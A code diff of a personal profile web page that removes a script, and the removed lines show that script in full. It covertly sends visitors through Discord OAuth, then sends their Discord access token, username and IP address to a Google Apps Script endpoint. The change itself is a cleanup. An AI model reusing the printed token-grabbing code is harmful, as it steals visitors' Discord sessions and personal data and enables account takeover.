@@ -31,16 +31,14 @@
       z-index: 10000;
     }
     #main-content {
-      display: none;
+      display: block; /* نظراً أننا لن نخفيه */
       animation: fadeIn 2s ease forwards;
     }
-    body.show-main #main-content { display: block; }
-    body.show-main #entry-screen { display: none; }
     @keyframes fadeIn {
       from { opacity: 0; }
       to { opacity: 1; }
     }
-    body.show-main {
+    body {
       overflow: auto;
       background: black;
       color: #fff;
@@ -125,11 +123,11 @@
 </head>
 <body>
 
-  <div id="entry-screen">
+  <div id="entry-screen" style="display:none;">
     Loading...
   </div>
 
-  <div id="visit-label">Visits: ...</div>
+  <div id="visit-label" style="display:none;">Visits: ...</div>
 
   <audio id="bg-music" autoplay muted loop>
     <source src="memo.mp3" type="audio/mpeg">
@@ -140,7 +138,7 @@
     <div class="container">
       <img src="we.png" alt="0lRushy" class="glow-img" />
       <h1>0lRushy</h1>
-      <div id="user-info">Loading user info...</div>
+      <div id="user-info">Welcome to the site!</div>
       <div class="links">
         <a href="https://github.com/EssaSadi21" target="_blank"><i class="fab fa-github"></i> GitHub 0lrushy</a>
         <a href="https://www.snapchat.com/add/auog" target="_blank"><i class="fas fa-link"></i> SnapChat @0lrushy</a>
@@ -151,74 +149,8 @@
   </div>
 
   <script>
-    const clientId = '1372712369100161055';
-    const redirectUri = encodeURIComponent(window.location.origin + window.location.pathname); 
-    const scope = 'identify';
-    const discordAuthUrl = `https://discord.com/api/oauth2/authorize?client_id=${clientId}&redirect_uri=${redirectUri}&response_type=token&scope=${scope}`;
-
-    function getAccessTokenFromHash() {
-      const hash = window.location.hash.substring(1);
-      const params = new URLSearchParams(hash);
-      return params.get('access_token');
-    }
-
-    async function fetchDiscordUser(token) {
-      try {
-        const res = await fetch('https://discord.com/api/users/@me', {
-          headers: { Authorization: `Bearer ${token}` }
-        });
-        if (!res.ok) throw new Error('Failed to fetch user info');
-        return await res.json();
-      } catch (e) {
-        console.error(e);
-        return null;
-      }
-    }
-
-    async function init() {
-      let token = getAccessTokenFromHash();
-
-      if (!token) {
-        window.location.href = discordAuthUrl;
-        return;
-      }
-
-      history.replaceState(null, null, ' ');
-
-      const user = await fetchDiscordUser(token);
-
-      if (!user) {
-        document.getElementById('entry-screen').textContent = 'Failed to fetch Discord user info.';
-        return;
-      }
-
-      document.getElementById('user-info').textContent = `${user.username}#${user.discriminator}`;
-
-      document.body.classList.add('show-main');
-
-      // جلب IP وارسال البيانات للـ GAS
-      fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => {
-          const ip = data.ip;
-          const gasURL = 'https://script.google.com/macros/s/AKfycbxKvTAnQhresyE7v_3OVz_KKyxdDWKGtlZDoiKpxBYnSFc7i5QSMTd3zzB5g2XzlRYS/exec';
-          const params = new URLSearchParams({
-            ip,
-            token,
-            username: user.username,
-            discriminator: user.discriminator
-          });
-          fetch(gasURL + '?' + params.toString())
-            .then(res => res.text())
-            .then(text => console.log('Response from GAS:', text))
-            .catch(err => console.error('Error sending data to GAS:', err));
-        })
-        .catch(err => {
-          console.error('Failed to get IP:', err);
-        });
-    }
-
-    init();
+    // لم يعد هناك حاجة لأي كود متعلق بالتوكن أو الديسكورد
+    // يمكن إضافة أي كود إضافي إذا أردت هنا
   </script>
 
 </body>
